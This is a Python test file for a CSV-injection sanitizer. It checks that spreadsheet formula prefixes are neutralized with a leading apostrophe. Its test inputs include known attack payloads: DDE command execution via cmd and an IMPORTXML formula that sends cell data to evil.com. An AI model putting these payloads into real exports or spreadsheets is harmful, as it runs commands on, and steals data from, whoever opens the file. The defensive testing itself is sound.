"""
Tests for CSV Security Utilities
Security Fix (2025-10-23): Verify CSV injection prevention.
"""
from __future__ import annotations

from landlord.utils.csv_security import sanitize_csv_row, sanitize_csv_value


class TestCSVSanitization:
    """Test CSV injection prevention."""

    def test_sanitize_normal_text(self):
        """Normal text passes through unchanged."""
        assert sanitize_csv_value("Alice") == "Alice"
        assert sanitize_csv_value("123") == "123"
        assert sanitize_csv_value("Normal text with spaces") == "Normal text with spaces"

    def test_sanitize_formula_equals(self):
        """Formulas starting with = are prefixed with '."""
        assert sanitize_csv_value("=SUM(A1:A10)") == "'=SUM(A1:A10)"
        assert sanitize_csv_value("=1+1") == "'=1+1"
        assert sanitize_csv_value("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"

    def test_sanitize_formula_plus(self):
        """Formulas starting with + are prefixed with '."""
        assert sanitize_csv_value("+1") == "'+1"
        assert sanitize_csv_value("+123") == "'+123"

    def test_sanitize_formula_minus(self):
        """Formulas starting with - are prefixed with '."""
        assert sanitize_csv_value("-1") == "'-1"
        assert sanitize_csv_value("-IMPORTXML(...)") == "'-IMPORTXML(...)"

    def test_sanitize_formula_at(self):
        """Formulas starting with @ are prefixed with '."""
        assert sanitize_csv_value("@SUM(A1:A10)") == "'@SUM(A1:A10)"

    def test_sanitize_formula_tab(self):
        """Values starting with tab are prefixed with '."""
        assert sanitize_csv_value("\tHidden") == "'\tHidden"

    def test_sanitize_none(self):
        """None values become empty string."""
        assert sanitize_csv_value(None) == ""

    def test_sanitize_empty_string(self):
        """Empty strings remain empty."""
        assert sanitize_csv_value("") == ""
        assert sanitize_csv_value("   ") == ""  # Whitespace stripped

    def test_sanitize_row_dict(self):
        """Sanitize all values in a row dictionary."""
        row = {
            "name": "Alice",
            "formula": "=1+1",
            "amount": "+100",
            "normal": "Text",
        }
        result = sanitize_csv_row(row)

        assert result["name"] == "Alice"
        assert result["formula"] == "'=1+1"
        assert result["amount"] == "'+100"
        assert result["normal"] == "Text"

    def test_sanitize_row_with_none(self):
        """None values in row become empty strings."""
        row = {"name": "Alice", "empty": None}
        result = sanitize_csv_row(row)

        assert result["name"] == "Alice"
        assert result["empty"] == ""

    def test_real_world_attack_examples(self):
        """Test against known CSV injection payloads."""
        # Windows Calculator
        assert sanitize_csv_value("=cmd|'/c calc'!A1").startswith("'")

        # Data exfiltration
        assert sanitize_csv_value("=IMPORTXML(CONCAT(\"http://evil.com/?\",A1:A10),\"//\")").startswith("'")

        # DDE attack
        assert sanitize_csv_value("=2+5+cmd|'/c calc'!A1").startswith("'")

        # Batch file execution
        assert sanitize_csv_value("@echo off | calc").startswith("'")
